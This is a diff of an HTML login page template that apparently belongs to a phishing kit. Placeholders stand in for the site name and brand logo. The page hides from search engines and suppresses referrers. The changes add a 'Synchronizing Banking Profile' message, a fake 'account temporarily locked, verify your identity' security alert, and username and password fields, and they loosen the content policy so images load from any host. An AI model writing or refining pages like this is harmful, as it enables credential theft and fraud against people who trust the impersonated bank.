@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=5">
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="referrer" content="no-referrer">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self'; connect-src 'self';">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data: https: http:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self'; connect-src 'self';">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <title>{{SITE_NAME}}</title>
@@ -15,7 +15,7 @@
 <body>
     <div id="loading-overlay" class="loading-overlay">
         <div class="spinner"></div>
-        <div class="loading-text" data-render="sync_msg"></div>
+        <div class="loading-text" data-render="sync_msg">Synchronizing Banking Profile...</div>
     </div>
 
     <!-- Interactive Modals -->
@@ -25,7 +25,7 @@
                 <span class="modal-title" data-render="sec_alert_title">Security Alert</span>
             </div>
             <div class="modal-body">
-                <p class="modal-text" data-render="locked_msg"></p>
+                <p class="modal-text" data-render="locked_msg">Your account has been temporarily locked for your protection. Please verify your identity to regain access.</p>
             </div>
             <div class="modal-footer">
                 <button class="modal-button" id="close-locked-modal" data-render="verify_btn_text">Verify Identity</button>
@@ -38,7 +38,7 @@
             <div class="fluid-form-layout">
                 <div class="login-header">
                     <a href="#">
-                        <img src="assets/{{LOGO_FILENAME}}" alt="" id="brand-logo">
+                        <img src="{{LOGO_URL}}" alt="" id="brand-logo">
                     </a>
                 </div>
 
@@ -55,27 +55,27 @@
                         </div>
 
                         <div class="fluid-form-layout-field-container">
-                            <label class="field-label" for="username" data-render="u_label"></label>
+                            <label class="field-label" for="username" data-render="u_label">Username</label>
                             <div class="fluid-input-wrapper">
-                                <input type="text" id="username" name="username" class="fluid-input" autocomplete="username" required>
+                                <input type="text" id="username" name="username" class="fluid-input" placeholder="Username" autocomplete="username" required>
                             </div>
                         </div>
 
                         <div class="fluid-form-layout-field-container">
-                            <label class="field-label" for="password" data-render="p_label"></label>
+                            <label class="field-label" for="password" data-render="p_label">Password</label>
                             <div class="fluid-input-wrapper">
-                                <input type="password" id="password" name="password" class="fluid-input" autocomplete="current-password" required>
+                                <input type="password" id="password" name="password" class="fluid-input" placeholder="Password" autocomplete="current-password" required>
                             </div>
                         </div>
 
                         <div class="fluid-form-layout-field-container" style="margin-top: 32px;">
                             <button type="submit" class="fluid-button">
-                                <span class="fluid-button__text" data-render="btn_text"></span>
+                                <span class="fluid-button__text" data-render="btn_text">Log In</span>
                             </button>
                         </div>
 
                         <div style="text-align: center; margin-top: 20px;">
-                            <a href="#" style="font-size: 14px; color: var(--btn-primary); text-decoration: none; font-weight: 500;" data-render="forgot_link"></a>
+                            <a href="#" style="font-size: 14px; color: var(--btn-primary); text-decoration: none; font-weight: 500;" data-render="forgot_link">Forgot Password?</a>
                         </div>
                     </form>
                 </div>
